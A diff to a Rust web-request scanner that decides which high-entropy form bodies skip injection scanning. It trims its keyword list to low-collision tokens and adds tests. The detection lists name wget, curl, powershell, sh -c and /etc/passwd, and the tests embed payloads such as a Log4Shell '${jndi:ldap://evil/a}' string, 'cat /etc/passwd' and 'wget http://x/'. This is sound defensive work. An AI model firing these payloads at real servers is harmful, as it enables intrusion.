@@ -445,20 +445,29 @@ fn shannon_entropy(s: &str) -> f32 {
 /// High-specificity injection shapes that MUST stay on the scan path
 /// even inside a high-entropy form body (S2 risk mitigation, §5): an
 /// attacker who pads a real payload to look opaque is still scanned.
-/// Deliberately high-specificity (multi-char, low benign-collision) —
-/// NOT bare command words like `cat`/`id`, which collide with random
-/// blobs and would defeat the gate. Erring toward `true` (keep
-/// scanning) only risks an FP, never a miss, so the bias is safe.
+///
+/// Deliberately **multi-char, low benign-collision** tokens only.
+/// 2026-06-18 (round-2 FP fix): the bare 1–2 char metacharacters
+/// `` ` `` / `$(` / `${` / `{{` / `<%` were REMOVED. A real Akamai/F5
+/// `sensor_data` beacon is ~5 KB of high-entropy printable ASCII and
+/// contains those bytes by chance with probability ≈ 1, so they
+/// re-admitted the exact bodies this gate exists to skip — driving the
+/// command-injection / sqli benign blocks. Log4Shell's `${jndi…}` is
+/// preserved explicitly (`${jndi`), and `/bin/` / `/etc/passwd` /
+/// `sh -c` / `cmd /c` / `powershell` / `union`+`select` / `wget` /
+/// `curl` / `nslookup` are long enough that random collision in a blob
+/// is negligible. A genuine `$(id)` / `` `id` `` / `{{7*7}}` payload
+/// *padded into a single-dominant high-entropy form value* is the
+/// documented, accepted trade-off — real injection in parseable form
+/// data is multi-field / low-entropy and never reaches this gate.
 fn has_high_signal_injection_shape(body: &str) -> bool {
-    const LITERAL_SHAPES: &[&str] = &[
-        "$(", "${", "{{", "<%", "`", "/bin/", "/etc/passwd",
-    ];
+    const LITERAL_SHAPES: &[&str] = &["/bin/", "/etc/passwd"];
     if LITERAL_SHAPES.iter().any(|s| body.contains(s)) {
         return true;
     }
     let lower = body.to_ascii_lowercase();
     const CI_SHAPES: &[&str] = &[
-        "sh -c", "cmd /c", "powershell", "union", "select", "wget", "curl", "nslookup",
+        "${jndi", "sh -c", "cmd /c", "powershell", "union", "select", "wget", "curl", "nslookup",
     ];
     CI_SHAPES.iter().any(|s| lower.contains(s))
 }
@@ -504,13 +513,19 @@ pub(crate) fn form_body_is_opaque_beacon(headers: &http::HeaderMap, body: &str) 
     if has_high_signal_injection_shape(body) {
         return false;
     }
-    // Longest single value among `&`-separated pairs (text/plain has no
-    // `&`/`=`, so the whole body is the value).
-    let longest = body
-        .split('&')
-        .map(|pair| pair.split_once('=').map(|(_, v)| v).unwrap_or(pair))
-        .max_by_key(|v| v.len())
-        .unwrap_or("");
+    // Longest single value. For `text/plain` the whole body IS the value —
+    // do NOT split on `=` (real sensor beacons are JSON-ish text containing
+    // `=`, e.g. base64 padding `…Hi8=;…`; splitting would truncate the
+    // candidate value and let the beacon escape the gate). For
+    // form-urlencoded, take the longest value among `&`-separated `k=v` pairs.
+    let longest = if ct == "text/plain" {
+        body
+    } else {
+        body.split('&')
+            .map(|pair| pair.split_once('=').map(|(_, v)| v).unwrap_or(pair))
+            .max_by_key(|v| v.len())
+            .unwrap_or("")
+    };
     longest.len() >= BEACON_MIN_VALUE_LEN
         && (longest.len() as f32) >= BEACON_DOMINANCE * (body.len() as f32)
         && shannon_entropy(longest) >= BEACON_MIN_ENTROPY_BITS
@@ -847,15 +862,71 @@ mod tests {
 
     #[test]
     fn beacon_with_injection_shape_is_scanned() {
-        // Padded-to-look-opaque payloads keep the keyword fast-path.
+        // Padded-to-look-opaque payloads keep the keyword fast-path — but
+        // only for HIGH-SPECIFICITY multi-char shapes that don't collide
+        // with random ASCII. Bare `$(` / `` ` `` / `${` / `{{` / `<%` were
+        // dropped (2026-06-18 round-2 FP fix): each appears in ~every 5 KB
+        // sensor beacon by chance and re-admitted the body this gate exists
+        // to skip. See `beacon_with_stray_subshell_metachars_stays_opaque`.
         let h = headers_ct("application/x-www-form-urlencoded");
-        for shape in ["$(id)", "{{7*7}}", "${7*7}", "UNION SELECT", "wget http://x/"] {
+        for shape in [
+            "${jndi:ldap://x/a}",
+            "/bin/sh",
+            "cat /etc/passwd",
+            "sh -c id",
+            "UNION SELECT",
+            "wget http://x/",
+            "curl http://x/",
+            "powershell",
+        ] {
             let body = format!("d={}{}", high_entropy_blob(), shape);
             assert!(
                 !form_body_is_opaque_beacon(&h, &body),
                 "high-signal shape must stay scannable: {shape}"
             );
         }
+    }
+
+    #[test]
+    fn beacon_with_stray_subshell_metachars_stays_opaque() {
+        // 2026-06-18 round-2 FP: real Akamai `sensor_data` beacons are ~5 KB
+        // of high-entropy printable ASCII and contain stray `` `id` `` /
+        // `$(ls)` / `${x}` / `{{y}}` shapes BY CHANCE. Those bare 1–2 char
+        // metacharacters must NOT re-admit the beacon — otherwise the body
+        // scanner re-trips cmdi/sqli on the random blob (the cmdi/sqli FP
+        // root cause). Only high-specificity multi-char tokens re-admit.
+        let mut blob = high_entropy_blob();
+        blob.push_str("q`id`w$(ls)e${x}r{{y}}t");
+        let body = format!("{{\"sensor_data\":\"{blob}\"}}");
+        let h = headers_ct("text/plain;charset=UTF-8");
+        assert!(
+            form_body_is_opaque_beacon(&h, &body),
+            "beacon with only stray bare metachars must stay opaque",
+        );
+    }
+
+    #[test]
+    fn beacon_text_plain_with_embedded_equals_stays_opaque() {
+        // Real Akamai `sensor_data` text/plain bodies are JSON-ish and carry
+        // `=` (base64 padding) — the gate must not split on `=` for
+        // text/plain or the candidate value truncates and the beacon escapes.
+        let body = format!("{{\"sensor_data\":\"{}Hi8=;8,17,0,0\"}}", high_entropy_blob());
+        let h = headers_ct("text/plain;charset=UTF-8");
+        assert!(
+            form_body_is_opaque_beacon(&h, &body),
+            "text/plain beacon with embedded '=' must stay opaque",
+        );
+    }
+
+    #[test]
+    fn beacon_log4shell_jndi_still_scanned() {
+        // The one multi-char `${…}` shape we must never skip: log4shell.
+        let h = headers_ct("text/plain");
+        let body = format!("{}${{jndi:ldap://evil/a}}", high_entropy_blob());
+        assert!(
+            !form_body_is_opaque_beacon(&h, &body),
+            "log4shell ${{jndi:}} must keep the body scannable",
+        );
     }
 
     #[test]
